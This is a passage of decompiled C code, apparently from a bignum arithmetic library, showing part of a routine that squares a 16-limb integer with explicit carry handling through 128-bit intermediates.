  unsigned __int64 v367; // r9
  _BOOL8 v368; // rbx
  unsigned __int128 v369; // ax
  unsigned __int64 v370; // rcx
  unsigned __int64 v371; // r9
  _BOOL8 v372; // rbx
  unsigned __int128 v373; // ax
  unsigned __int64 v374; // r8
  unsigned __int64 v375; // r9
  _BOOL8 v376; // rbx
  unsigned __int128 v377; // ax
  unsigned __int64 v378; // rcx
  unsigned __int64 v379; // r9
  _BOOL8 v380; // rbx
  unsigned __int128 v381; // ax
  unsigned __int64 v382; // r11
  unsigned __int64 v383; // r9
  __int64 v384; // rbx
  unsigned __int64 v385; // rdi
  unsigned __int64 v386; // r10
  unsigned __int64 v387; // rcx
  unsigned __int128 v388; // ax
  unsigned __int64 v389; // r8
  unsigned __int64 v390; // r9
  _BOOL8 v391; // rdi
  unsigned __int128 v392; // ax
  unsigned __int64 v393; // rcx
  unsigned __int64 v394; // r9
  _BOOL8 v395; // rdi
  unsigned __int128 v396; // ax
  unsigned __int64 v397; // r8
  unsigned __int64 v398; // r9
  _BOOL8 v399; // rdi
  unsigned __int128 v400; // ax
  unsigned __int64 v401; // r8
  unsigned __int64 v402; // r9
  __int64 v403; // rdi
  unsigned __int128 v404; // ax
  unsigned __int64 v405; // r10
  unsigned __int64 v406; // r9
  unsigned __int64 v407; // rbx
  __int64 v408; // r11
  __int64 v409; // rdi
  unsigned __int64 v410; // rcx
  unsigned __int128 v411; // ax
  unsigned __int64 v412; // r8
  unsigned __int64 v413; // r9
  _BOOL8 v414; // rbx
  unsigned __int128 v415; // ax
  unsigned __int64 v416; // rcx
  unsigned __int64 v417; // r9
  _BOOL8 v418; // rbx
  unsigned __int128 v419; // ax
  unsigned __int64 v420; // r8
  unsigned __int64 v421; // r9
  _BOOL8 v422; // rbx
  unsigned __int128 v423; // ax
  unsigned __int64 v424; // r11
  unsigned __int64 v425; // r9
  __int64 v426; // rbx
  unsigned __int64 v427; // rdi
  unsigned __int64 v428; // r10
  unsigned __int64 v429; // rcx
  unsigned __int128 v430; // ax
  unsigned __int64 v431; // r8
  unsigned __int64 v432; // r9
  _BOOL8 v433; // rdi
  unsigned __int128 v434; // ax
  unsigned __int64 v435; // rcx
  unsigned __int64 v436; // r9
  _BOOL8 v437; // rdi
  unsigned __int128 v438; // ax
  unsigned __int64 v439; // r8
  unsigned __int64 v440; // r9
  __int64 v441; // rdi
  unsigned __int128 v442; // ax
  unsigned __int64 v443; // r10
  unsigned __int64 v444; // r9
  unsigned __int64 v445; // rbx
  __int64 v446; // r11
  __int64 v447; // rdi
  unsigned __int64 v448; // rcx
  unsigned __int128 v449; // ax
  unsigned __int64 v450; // r8
  unsigned __int64 v451; // r9
  _BOOL8 v452; // rbx
  unsigned __int128 v453; // ax
  unsigned __int64 v454; // rcx
  unsigned __int64 v455; // r9
  _BOOL8 v456; // rbx
  unsigned __int128 v457; // ax
  unsigned __int64 v458; // r11
  unsigned __int64 v459; // r9
  __int64 v460; // rbx
  unsigned __int64 v461; // rdi
  unsigned __int64 v462; // r10
  __int64 v463; // rbx
  unsigned __int64 v464; // rcx
  unsigned __int128 v465; // ax
  unsigned __int64 v466; // r8
  unsigned __int64 v467; // r9
  _BOOL8 v468; // rdi
  unsigned __int128 v469; // ax
  unsigned __int64 v470; // r8
  unsigned __int64 v471; // r9
  __int64 v472; // rdi
  unsigned __int128 v473; // ax
  unsigned __int64 v474; // r10
  unsigned __int64 v475; // r9
  unsigned __int64 v476; // rbx
  __int64 v477; // r11
  __int64 v478; // rdi
  unsigned __int64 v479; // rcx
  unsigned __int128 v480; // ax
  unsigned __int64 v481; // r8
  unsigned __int64 v482; // r9
  _BOOL8 v483; // rbx
  unsigned __int128 v484; // ax
  unsigned __int64 v485; // r11
  unsigned __int64 v486; // r9
  __int64 v487; // rbx
  unsigned __int64 v488; // rdi
  unsigned __int64 v489; // r10
  unsigned __int64 v490; // rcx
  unsigned __int128 v491; // ax
  unsigned __int64 v492; // r8
  __int64 v493; // rdi
  unsigned __int128 v494; // ax
  unsigned __int64 v495; // r10
  unsigned __int64 v496; // r9
  unsigned __int64 v497; // rbx
  __int64 v498; // rdi
  unsigned __int64 v499; // rcx
  unsigned __int128 v500; // ax
  unsigned __int64 v501; // r11
  unsigned __int64 v502; // r8
  __int64 v503; // rbx
  unsigned __int64 v504; // rdi
  unsigned __int64 v505; // r10
  __int64 v506; // r11
  signed __int128 v507; // t0
  unsigned __int128 v508; // ax
  unsigned __int64 v509; // r10
  unsigned __int64 v510; // r9
  unsigned __int64 v511; // rbx
  __int64 v512; // r11
  unsigned __int64 v513; // rcx
  unsigned __int64 v514; // r11
  unsigned __int64 v515; // r8
  unsigned __int128 v516; // ax
  unsigned __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = *((_QWORD *)&v4 + 1);
  *(_QWORD *)&v4 = *v2 * v2[1];
  v6 = *v2 * (unsigned __int128)v2[1] >> 64;
  *((_QWORD *)&v4 + 1) = (signed __int128)(*v2 * (unsigned __int128)v2[1]) >> 63;
  v7 = v5 + 2 * v4;
  a1[1] = v7;
  v8 = *((_QWORD *)&v4 + 1) + (v7 < 2 * (signed __int64)v4);
  v9 = (v8 < (v7 < 2 * (signed __int64)v4)) + (unsigned __int64)((signed __int128)v6 >> 63);
  v10 = (signed __int128)(*v2 * (unsigned __int128)v2[2] >> 64) >> 63;
  v11 = *v2 * (unsigned __int128)v2[2];
  v12 = v2[1] * (unsigned __int128)v2[1];
  *(_QWORD *)&v12 = 2 * v11 + v12;
  *((_QWORD *)&v12 + 1) += (unsigned __int64)v12 < 2 * (signed __int64)v11;
  v13 = v12 + v8;
  v14 = *((_QWORD *)&v12 + 1) + (unsigned __int128)(v11 >> 63);
  a1[2] = v13;
  v15 = (v13 < (unsigned __int64)v12) + v9;
  v16 = (v14 < *((_QWORD *)&v12 + 1)) + (v14 + v15 < v15) + v10;
  v17 = *v2 * v2[3];
  v18 = v2[1] * (unsigned __int128)v2[2];
  *(_QWORD *)&v18 = v17 + v18;
  *((_QWORD *)&v18 + 1) += (unsigned __int64)v18 < v17;
  v19 = v14 + v15 + 2 * v18;
  v20 = *((_QWORD *)&v18 + 1) + (*v2 * (unsigned __int128)v2[3] >> 64);
  v3[3] = v19;
  *((_QWORD *)&v11 + 1) = v20 < *((_QWORD *)&v18 + 1);
  *(_QWORD *)&v11 = v20;
  v21 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v20;
  *(_QWORD *)&v11 = v18;
  v22 = (v19 < 2 * (signed __int64)v18) + v16;
  v23 = (unsigned __int128)(v11 >> 63) + v22;
  v24 = v23 < v22;
  v25 = *v2 * v2[4];
  v26 = v2[1] * (unsigned __int128)v2[3];
  *(_QWORD *)&v26 = v25 + v26;
  *((_QWORD *)&v26 + 1) += (unsigned __int64)v26 < v25;
  *((_QWORD *)&v11 + 1) = (unsigned __int64)(*((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64)) < *((_QWORD *)&v26 + 1);
  *(_QWORD *)&v11 = *((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64);
  v27 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = *((_QWORD *)&v26 + 1) + (*v2 * (unsigned __int128)v2[4] >> 64);
  *(_QWORD *)&v11 = v26;
  v28 = 2 * v26;
  v29 = v2[2] * (unsigned __int128)v2[2];
  *(_QWORD *)&v29 = v28 + v29;
  *((_QWORD *)&v29 + 1) += (unsigned __int64)v29 < v28;
  v30 = v29 + v23;
  v31 = *((_QWORD *)&v29 + 1) + (unsigned __int128)(v11 >> 63);
  v3[4] = v30;
  v32 = (v30 < (unsigned __int64)v29) + v24 + v21;
  v33 = v31 + v32;
  v34 = (v31 < *((_QWORD *)&v29 + 1)) + (v31 + v32 < v32) + v27;
  v35 = *v2 * v2[5];
  v36 = v2[1] * (unsigned __int128)v2[4];
  v37 = v35 + v36;
  *((_QWORD *)&v36 + 1) += v35 + (unsigned __int64)v36 < v35;
  v38 = *((_QWORD *)&v36 + 1) + (*v2 * (unsigned __int128)v2[5] >> 64);
  v39 = v38 < *((_QWORD *)&v36 + 1);
  v40 = v2[2] * (unsigned __int128)v2[3];
  *(_QWORD *)&v40 = v37 + v40;
  *((_QWORD *)&v40 + 1) += (unsigned __int64)v40 < v37;
  v41 = v33 + 2 * v40;
  v42 = *((_QWORD *)&v40 + 1) + v38;
  v3[5] = v41;
  *((_QWORD *)&v11 + 1) = (v42 < *((_QWORD *)&v40 + 1)) + v39;
  *(_QWORD *)&v11 = v42;
  v43 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v42;
  *(_QWORD *)&v11 = v40;
  v44 = (v41 < 2 * (signed __int64)v40) + v34;
  v45 = (unsigned __int128)(v11 >> 63) + v44;
  v24 = v45 < v44;
  v46 = *v2 * v2[6];
  v47 = v2[1] * (unsigned __int128)v2[5];
  v48 = v46 + v47;
  *((_QWORD *)&v47 + 1) += v46 + (unsigned __int64)v47 < v46;
  v49 = *((_QWORD *)&v47 + 1) + (*v2 * (unsigned __int128)v2[6] >> 64);
  v50 = v49 < *((_QWORD *)&v47 + 1);
  v51 = v2[2] * (unsigned __int128)v2[4];
  *(_QWORD *)&v51 = v48 + v51;
  *((_QWORD *)&v51 + 1) += (unsigned __int64)v51 < v48;
  v52 = 2 * v51;
  v53 = *((_QWORD *)&v51 + 1) + v49;
  *((_QWORD *)&v11 + 1) = (v53 < *((_QWORD *)&v51 + 1)) + v50;
  *(_QWORD *)&v11 = v53;
  v54 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v53;
  *(_QWORD *)&v11 = v51;
  v55 = v2[3] * (unsigned __int128)v2[3];
  *(_QWORD *)&v55 = v52 + v55;
  *((_QWORD *)&v55 + 1) += (unsigned __int64)v55 < v52;
  v56 = v55 + v45;
  v57 = *((_QWORD *)&v55 + 1) + (unsigned __int128)(v11 >> 63);
  v58 = (v56 < (unsigned __int64)v55) + v24 + v43;
  v59 = v57 + v58;
  v3[6] = v56;
  v60 = (v57 < *((_QWORD *)&v55 + 1)) + (v57 + v58 < v58) + v54;
  v61 = *v2 * v2[7];
  v62 = v2[1] * (unsigned __int128)v2[6];
  v63 = v61 + v62;
  *((_QWORD *)&v62 + 1) += v61 + (unsigned __int64)v62 < v61;
  v64 = *((_QWORD *)&v62 + 1) + (*v2 * (unsigned __int128)v2[7] >> 64);
  v65 = v64 < *((_QWORD *)&v62 + 1);
  v66 = v2[2] * (unsigned __int128)v2[5];
  v67 = v63 + v66;
  *((_QWORD *)&v66 + 1) += v63 + (unsigned __int64)v66 < v63;
  v68 = *((_QWORD *)&v66 + 1) + v64;
  v69 = (v68 < *((_QWORD *)&v66 + 1)) + v65;
  v70 = v2[3] * (unsigned __int128)v2[4];
  *(_QWORD *)&v70 = v67 + v70;
  *((_QWORD *)&v70 + 1) += (unsigned __int64)v70 < v67;
  v71 = v59 + 2 * v70;
  v72 = *((_QWORD *)&v70 + 1) + v68;
  v3[7] = v71;
  *((_QWORD *)&v11 + 1) = (v72 < *((_QWORD *)&v70 + 1)) + v69;
  *(_QWORD *)&v11 = v72;
  v73 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v72;
  *(_QWORD *)&v11 = v70;
  v74 = (v71 < 2 * (signed __int64)v70) + v60;
  v75 = (unsigned __int128)(v11 >> 63) + v74;
  v76 = (v75 < v74) + v73;
  v77 = *v2 * v2[8];
  v78 = v2[1] * (unsigned __int128)v2[7];
  v79 = v77 + v78;
  *((_QWORD *)&v78 + 1) += v77 + (unsigned __int64)v78 < v77;
  v80 = *((_QWORD *)&v78 + 1) + (*v2 * (unsigned __int128)v2[8] >> 64);
  v81 = v80 < *((_QWORD *)&v78 + 1);
  v82 = v2[2] * (unsigned __int128)v2[6];
  v83 = v79 + v82;
  *((_QWORD *)&v82 + 1) += v79 + (unsigned __int64)v82 < v79;
  v84 = *((_QWORD *)&v82 + 1) + v80;
  v85 = (v84 < *((_QWORD *)&v82 + 1)) + v81;
  v86 = v2[3] * (unsigned __int128)v2[5];
  *(_QWORD *)&v86 = v83 + v86;
  *((_QWORD *)&v86 + 1) += (unsigned __int64)v86 < v83;
  v87 = 2 * v86;
  v88 = *((_QWORD *)&v86 + 1) + v84;
  *((_QWORD *)&v11 + 1) = (v88 < *((_QWORD *)&v86 + 1)) + v85;
  *(_QWORD *)&v11 = v88;
  v89 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v88;
  *(_QWORD *)&v11 = v86;
  v90 = v2[4] * (unsigned __int128)v2[4];
  *(_QWORD *)&v90 = v87 + v90;
  *((_QWORD *)&v90 + 1) += (unsigned __int64)v90 < v87;
  v91 = *((_QWORD *)&v90 + 1) + (unsigned __int128)(v11 >> 63);
  v92 = v90 + v75;
  v3[8] = v92;
  v93 = (v92 < (unsigned __int64)v90) + v76;
  v94 = v91 + v93;
  v95 = (v91 < *((_QWORD *)&v90 + 1)) + (v91 + v93 < v93) + v89;
  v96 = *v2 * v2[9];
  v97 = v2[1] * (unsigned __int128)v2[8];
  v98 = v96 + v97;
  *((_QWORD *)&v97 + 1) += v96 + (unsigned __int64)v97 < v96;
  v99 = *((_QWORD *)&v97 + 1) + (*v2 * (unsigned __int128)v2[9] >> 64);
  v100 = v99 < *((_QWORD *)&v97 + 1);
  v101 = v2[2] * (unsigned __int128)v2[7];
  v102 = v98 + v101;
  *((_QWORD *)&v101 + 1) += v98 + (unsigned __int64)v101 < v98;
  v103 = *((_QWORD *)&v101 + 1) + v99;
  v104 = (v103 < *((_QWORD *)&v101 + 1)) + v100;
  v105 = v2[3] * (unsigned __int128)v2[6];
  v106 = v102 + v105;
  *((_QWORD *)&v105 + 1) += v102 + (unsigned __int64)v105 < v102;
  v107 = *((_QWORD *)&v105 + 1) + v103;
  v108 = (v107 < *((_QWORD *)&v105 + 1)) + v104;
  v109 = v2[4] * (unsigned __int128)v2[5];
  *(_QWORD *)&v109 = v106 + v109;
  *((_QWORD *)&v109 + 1) += (unsigned __int64)v109 < v106;
  v110 = v94 + 2 * v109;
  v111 = *((_QWORD *)&v109 + 1) + v107;
  v3[9] = v110;
  *((_QWORD *)&v11 + 1) = (v111 < *((_QWORD *)&v109 + 1)) + v108;
  *(_QWORD *)&v11 = v111;
  v112 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v111;
  *(_QWORD *)&v11 = v109;
  v113 = (v110 < 2 * (signed __int64)v109) + v95;
  v114 = (unsigned __int128)(v11 >> 63) + v113;
  v24 = v114 < v113;
  v115 = *v2 * v2[10];
  v116 = v2[1] * (unsigned __int128)v2[9];
  v117 = v115 + v116;
  *((_QWORD *)&v116 + 1) += v115 + (unsigned __int64)v116 < v115;
  v118 = *((_QWORD *)&v116 + 1) + (*v2 * (unsigned __int128)v2[10] >> 64);
  v119 = v118 < *((_QWORD *)&v116 + 1);
  v120 = v2[2] * (unsigned __int128)v2[8];
  v121 = v117 + v120;
  *((_QWORD *)&v120 + 1) += v117 + (unsigned __int64)v120 < v117;
  v122 = *((_QWORD *)&v120 + 1) + v118;
  v123 = (v122 < *((_QWORD *)&v120 + 1)) + v119;
  v124 = v2[3] * (unsigned __int128)v2[7];
  v125 = v121 + v124;
  *((_QWORD *)&v124 + 1) += v121 + (unsigned __int64)v124 < v121;
  v126 = *((_QWORD *)&v124 + 1) + v122;
  v127 = (v126 < *((_QWORD *)&v124 + 1)) + v123;
  v128 = v2[4] * (unsigned __int128)v2[6];
  *(_QWORD *)&v128 = v125 + v128;
  *((_QWORD *)&v128 + 1) += (unsigned __int64)v128 < v125;
  v129 = 2 * v128;
  v130 = *((_QWORD *)&v128 + 1) + v126;
  *((_QWORD *)&v11 + 1) = (v130 < *((_QWORD *)&v128 + 1)) + v127;
  *(_QWORD *)&v11 = v130;
  v131 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v130;
  *(_QWORD *)&v11 = v128;
  v132 = v2[5] * (unsigned __int128)v2[5];
  *(_QWORD *)&v132 = v129 + v132;
  *((_QWORD *)&v132 + 1) += (unsigned __int64)v132 < v129;
  v133 = v132 + v114;
  v134 = *((_QWORD *)&v132 + 1) + (unsigned __int128)(v11 >> 63);
  v3[10] = v133;
  v135 = (v133 < (unsigned __int64)v132) + v24 + v112;
  v136 = v134 + v135;
  v137 = (v134 < *((_QWORD *)&v132 + 1)) + (v134 + v135 < v135) + v131;
  v138 = *v2 * v2[11];
  v139 = v2[1] * (unsigned __int128)v2[10];
  v140 = v138 + v139;
  *((_QWORD *)&v139 + 1) += v138 + (unsigned __int64)v139 < v138;
  v141 = *((_QWORD *)&v139 + 1) + (*v2 * (unsigned __int128)v2[11] >> 64);
  v142 = v141 < *((_QWORD *)&v139 + 1);
  v143 = v2[2] * (unsigned __int128)v2[9];
  v144 = v140 + v143;
  *((_QWORD *)&v143 + 1) += v140 + (unsigned __int64)v143 < v140;
  v145 = *((_QWORD *)&v143 + 1) + v141;
  v146 = (v145 < *((_QWORD *)&v143 + 1)) + v142;
  v147 = v2[3] * (unsigned __int128)v2[8];
  v148 = v144 + v147;
  *((_QWORD *)&v147 + 1) += v144 + (unsigned __int64)v147 < v144;
  v149 = *((_QWORD *)&v147 + 1) + v145;
  v150 = (v149 < *((_QWORD *)&v147 + 1)) + v146;
  v151 = v2[4] * (unsigned __int128)v2[7];
  v152 = v148 + v151;
  *((_QWORD *)&v151 + 1) += v148 + (unsigned __int64)v151 < v148;
  v153 = *((_QWORD *)&v151 + 1) + v149;
  v154 = (v153 < *((_QWORD *)&v151 + 1)) + v150;
  v155 = v2[5] * (unsigned __int128)v2[6];
  *(_QWORD *)&v155 = v152 + v155;
  *((_QWORD *)&v155 + 1) += (unsigned __int64)v155 < v152;
  v156 = v136 + 2 * v155;
  v157 = *((_QWORD *)&v155 + 1) + v153;
  *((_QWORD *)&v11 + 1) = (v157 < *((_QWORD *)&v155 + 1)) + v154;
  *(_QWORD *)&v11 = v157;
  v158 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v157;
  *(_QWORD *)&v11 = v155;
  v159 = (v156 < 2 * (signed __int64)v155) + v137;
  v3[11] = v156;
  v160 = (unsigned __int128)(v11 >> 63) + v159;
  v161 = (v160 < v159) + v158;
  v162 = *v2 * v2[12];
  v163 = v2[1] * (unsigned __int128)v2[11];
  v164 = v162 + v163;
  *((_QWORD *)&v163 + 1) += v162 + (unsigned __int64)v163 < v162;
  v165 = *((_QWORD *)&v163 + 1) + (*v2 * (unsigned __int128)v2[12] >> 64);
  v166 = v165 < *((_QWORD *)&v163 + 1);
  v167 = v2[2] * (unsigned __int128)v2[10];
  v168 = v164 + v167;
  *((_QWORD *)&v167 + 1) += v164 + (unsigned __int64)v167 < v164;
  v169 = *((_QWORD *)&v167 + 1) + v165;
  v170 = (v169 < *((_QWORD *)&v167 + 1)) + v166;
  v171 = v2[3] * (unsigned __int128)v2[9];
  v172 = v168 + v171;
  *((_QWORD *)&v171 + 1) += v168 + (unsigned __int64)v171 < v168;
  v173 = *((_QWORD *)&v171 + 1) + v169;
  v174 = (v173 < *((_QWORD *)&v171 + 1)) + v170;
  v175 = v2[4] * (unsigned __int128)v2[8];
  v176 = v172 + v175;
  *((_QWORD *)&v175 + 1) += v172 + (unsigned __int64)v175 < v172;
  v177 = *((_QWORD *)&v175 + 1) + v173;
  v178 = (v177 < *((_QWORD *)&v175 + 1)) + v174;
  v179 = v2[5] * (unsigned __int128)v2[7];
  *(_QWORD *)&v179 = v176 + v179;
  *((_QWORD *)&v179 + 1) += (unsigned __int64)v179 < v176;
  v180 = 2 * v179;
  v181 = *((_QWORD *)&v179 + 1) + v177;
  *((_QWORD *)&v11 + 1) = (v181 < *((_QWORD *)&v179 + 1)) + v178;
  *(_QWORD *)&v11 = v181;
  v182 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v181;
  *(_QWORD *)&v11 = v179;
  v183 = v2[6] * (unsigned __int128)v2[6];
  *(_QWORD *)&v183 = v180 + v183;
  *((_QWORD *)&v183 + 1) += (unsigned __int64)v183 < v180;
  v184 = v183 + v160;
  v185 = *((_QWORD *)&v183 + 1) + (unsigned __int128)(v11 >> 63);
  v3[12] = v184;
  v186 = (v184 < (unsigned __int64)v183) + v161;
  v187 = v185 + v186;
  v188 = (v185 < *((_QWORD *)&v183 + 1)) + (v185 + v186 < v186) + v182;
  v189 = *v2 * v2[13];
  v190 = v2[1] * (unsigned __int128)v2[12];
  v191 = v189 + v190;
  *((_QWORD *)&v190 + 1) += v189 + (unsigned __int64)v190 < v189;
  v192 = *((_QWORD *)&v190 + 1) + (*v2 * (unsigned __int128)v2[13] >> 64);
  v193 = v192 < *((_QWORD *)&v190 + 1);
  v194 = v2[2] * (unsigned __int128)v2[11];
  v195 = v191 + v194;
  *((_QWORD *)&v194 + 1) += v191 + (unsigned __int64)v194 < v191;
  v196 = *((_QWORD *)&v194 + 1) + v192;
  v197 = (v196 < *((_QWORD *)&v194 + 1)) + v193;
  v198 = v2[3] * (unsigned __int128)v2[10];
  v199 = v195 + v198;
  *((_QWORD *)&v198 + 1) += v195 + (unsigned __int64)v198 < v195;
  v200 = *((_QWORD *)&v198 + 1) + v196;
  v201 = (v200 < *((_QWORD *)&v198 + 1)) + v197;
  v202 = v2[4] * (unsigned __int128)v2[9];
  v203 = v199 + v202;
  *((_QWORD *)&v202 + 1) += v199 + (unsigned __int64)v202 < v199;
  v204 = *((_QWORD *)&v202 + 1) + v200;
  v205 = (v204 < *((_QWORD *)&v202 + 1)) + v201;
  v206 = v2[5] * (unsigned __int128)v2[8];
  v207 = v203 + v206;
  *((_QWORD *)&v206 + 1) += v203 + (unsigned __int64)v206 < v203;
  v208 = *((_QWORD *)&v206 + 1) + v204;
  v209 = (v208 < *((_QWORD *)&v206 + 1)) + v205;
  v210 = v2[6] * (unsigned __int128)v2[7];
  *(_QWORD *)&v210 = v207 + v210;
  *((_QWORD *)&v210 + 1) += (unsigned __int64)v210 < v207;
  v211 = v187 + 2 * v210;
  v212 = *((_QWORD *)&v210 + 1) + v208;
  v3[13] = v211;
  *((_QWORD *)&v11 + 1) = (v212 < *((_QWORD *)&v210 + 1)) + v209;
  *(_QWORD *)&v11 = v212;
  v213 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v212;
  *(_QWORD *)&v11 = v210;
  v214 = (v211 < 2 * (signed __int64)v210) + v188;
  v215 = (unsigned __int128)(v11 >> 63) + v214;
  v24 = v215 < v214;
  v216 = *v2 * v2[14];
  v217 = v2[1] * (unsigned __int128)v2[13];
  v218 = v216 + v217;
  *((_QWORD *)&v217 + 1) += v216 + (unsigned __int64)v217 < v216;
  v219 = *((_QWORD *)&v217 + 1) + (*v2 * (unsigned __int128)v2[14] >> 64);
  v220 = v219 < *((_QWORD *)&v217 + 1);
  v221 = v2[2] * (unsigned __int128)v2[12];
  v222 = v218 + v221;
  *((_QWORD *)&v221 + 1) += v218 + (unsigned __int64)v221 < v218;
  v223 = *((_QWORD *)&v221 + 1) + v219;
  v224 = (v223 < *((_QWORD *)&v221 + 1)) + v220;
  v225 = v2[3] * (unsigned __int128)v2[11];
  v226 = v222 + v225;
  *((_QWORD *)&v225 + 1) += v222 + (unsigned __int64)v225 < v222;
  v227 = *((_QWORD *)&v225 + 1) + v223;
  v228 = (v227 < *((_QWORD *)&v225 + 1)) + v224;
  v229 = v2[4] * (unsigned __int128)v2[10];
  v230 = v226 + v229;
  *((_QWORD *)&v229 + 1) += v226 + (unsigned __int64)v229 < v226;
  v231 = *((_QWORD *)&v229 + 1) + v227;
  v232 = (v231 < *((_QWORD *)&v229 + 1)) + v228;
  v233 = v2[5] * (unsigned __int128)v2[9];
  v234 = v230 + v233;
  *((_QWORD *)&v233 + 1) += v230 + (unsigned __int64)v233 < v230;
  v235 = *((_QWORD *)&v233 + 1) + v231;
  v236 = (v235 < *((_QWORD *)&v233 + 1)) + v232;
  v237 = v2[6] * (unsigned __int128)v2[8];
  *(_QWORD *)&v237 = v234 + v237;
  *((_QWORD *)&v237 + 1) += (unsigned __int64)v237 < v234;
  v238 = 2 * v237;
  v239 = *((_QWORD *)&v237 + 1) + v235;
  *((_QWORD *)&v11 + 1) = (v239 < *((_QWORD *)&v237 + 1)) + v236;
  *(_QWORD *)&v11 = v239;
  v240 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v239;
  *(_QWORD *)&v11 = v237;
  v241 = v2[7] * (unsigned __int128)v2[7];
  *(_QWORD *)&v241 = v238 + v241;
  *((_QWORD *)&v241 + 1) += (unsigned __int64)v241 < v238;
  v242 = v241 + v215;
  v243 = *((_QWORD *)&v241 + 1) + (unsigned __int128)(v11 >> 63);
  v3[14] = v242;
  v244 = (v242 < (unsigned __int64)v241) + v24 + v213;
  v245 = v243 + v244;
  v246 = (v243 < *((_QWORD *)&v241 + 1)) + (v243 + v244 < v244) + v240;
  v247 = *v2 * v2[15];
  v248 = v2[1] * (unsigned __int128)v2[14];
  v249 = v247 + v248;
  *((_QWORD *)&v248 + 1) += v247 + (unsigned __int64)v248 < v247;
  v250 = *((_QWORD *)&v248 + 1) + (*v2 * (unsigned __int128)v2[15] >> 64);
  v251 = v250 < *((_QWORD *)&v248 + 1);
  v252 = v2[2] * (unsigned __int128)v2[13];
  v253 = v249 + v252;
  *((_QWORD *)&v252 + 1) += v249 + (unsigned __int64)v252 < v249;
  v254 = *((_QWORD *)&v252 + 1) + v250;
  v255 = (v254 < *((_QWORD *)&v252 + 1)) + v251;
  v256 = v2[3] * (unsigned __int128)v2[12];
  v257 = v253 + v256;
  *((_QWORD *)&v256 + 1) += v253 + (unsigned __int64)v256 < v253;
  v258 = *((_QWORD *)&v256 + 1) + v254;
  v259 = (v258 < *((_QWORD *)&v256 + 1)) + v255;
  v260 = v2[4] * (unsigned __int128)v2[11];
  v261 = v257 + v260;
  *((_QWORD *)&v260 + 1) += v257 + (unsigned __int64)v260 < v257;
  v262 = *((_QWORD *)&v260 + 1) + v258;
  v263 = (v262 < *((_QWORD *)&v260 + 1)) + v259;
  v264 = v2[5] * (unsigned __int128)v2[10];
  v265 = v261 + v264;
  *((_QWORD *)&v264 + 1) += v261 + (unsigned __int64)v264 < v261;
  v266 = *((_QWORD *)&v264 + 1) + v262;
  v267 = (v266 < *((_QWORD *)&v264 + 1)) + v263;
  v268 = v2[6] * (unsigned __int128)v2[9];
  v269 = v265 + v268;
  *((_QWORD *)&v268 + 1) += v265 + (unsigned __int64)v268 < v265;
  v270 = *((_QWORD *)&v268 + 1) + v266;
  v271 = (v270 < *((_QWORD *)&v268 + 1)) + v267;
  v272 = v2[7] * (unsigned __int128)v2[8];
  *(_QWORD *)&v272 = v269 + v272;
  *((_QWORD *)&v272 + 1) += (unsigned __int64)v272 < v269;
  v273 = v245 + 2 * v272;
  v274 = *((_QWORD *)&v272 + 1) + v270;
  v3[15] = v273;
  *((_QWORD *)&v11 + 1) = (v274 < *((_QWORD *)&v272 + 1)) + v271;
  *(_QWORD *)&v11 = v274;
  v275 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v274;
  *(_QWORD *)&v11 = v272;
  v276 = (v273 < 2 * (signed __int64)v272) + v246;
  v277 = (unsigned __int128)(v11 >> 63) + v276;
  v24 = v277 < v276;
  v278 = v2[1] * v2[15];
  v279 = v2[2] * (unsigned __int128)v2[14];
  v280 = v278 + v279;
  *((_QWORD *)&v279 + 1) += v278 + (unsigned __int64)v279 < v278;
  v281 = *((_QWORD *)&v279 + 1) + (v2[1] * (unsigned __int128)v2[15] >> 64);
  v282 = v281 < *((_QWORD *)&v279 + 1);
  v283 = v2[3] * (unsigned __int128)v2[13];
  v284 = v280 + v283;
  *((_QWORD *)&v283 + 1) += v280 + (unsigned __int64)v283 < v280;
  v285 = *((_QWORD *)&v283 + 1) + v281;
  v286 = (v285 < *((_QWORD *)&v283 + 1)) + v282;
  v287 = v2[4] * (unsigned __int128)v2[12];
  v288 = v284 + v287;
  *((_QWORD *)&v287 + 1) += v284 + (unsigned __int64)v287 < v284;
  v289 = *((_QWORD *)&v287 + 1) + v285;
  v290 = (v289 < *((_QWORD *)&v287 + 1)) + v286;
  v291 = v2[5] * (unsigned __int128)v2[11];
  v292 = v288 + v291;
  *((_QWORD *)&v291 + 1) += v288 + (unsigned __int64)v291 < v288;
  v293 = *((_QWORD *)&v291 + 1) + v289;
  v294 = (v293 < *((_QWORD *)&v291 + 1)) + v290;
  v295 = v2[6] * (unsigned __int128)v2[10];
  v296 = v292 + v295;
  *((_QWORD *)&v295 + 1) += v292 + (unsigned __int64)v295 < v292;
  v297 = *((_QWORD *)&v295 + 1) + v293;
  v298 = (v297 < *((_QWORD *)&v295 + 1)) + v294;
  v299 = v2[7] * (unsigned __int128)v2[9];
  *(_QWORD *)&v299 = v296 + v299;
  *((_QWORD *)&v299 + 1) += (unsigned __int64)v299 < v296;
  v300 = *((_QWORD *)&v299 + 1) + v297;
  v301 = 2 * v299;
  *((_QWORD *)&v11 + 1) = (v300 < *((_QWORD *)&v299 + 1)) + v298;
  *(_QWORD *)&v11 = v300;
  v302 = v11 >> 63;
  *((_QWORD *)&v11 + 1) = v300;
  *(_QWORD *)&v11 = v299;
  v303 = v2[8] * (unsigned __int128)v2[8];
  *(_QWORD *)&v303 = v301 + v303;
  *((_QWORD *)&v303 + 1) += (unsigned __int64)v303 < v301;
  v304 = v303 + v277;
  v305 = *((_QWORD *)&v303 + 1) + (unsigned __int128)(v11 >> 63);
  v3[16] = v304;
  v306 = (v304 < (unsigned __int64)v303) + v24 + v275;
  v307 = v305 + v306;
  v308 = (v305 < *((_QWORD *)&v303 + 1)) + (v305 + v306 < v306) + v302;
  v309 = v2[2] * v2[15];
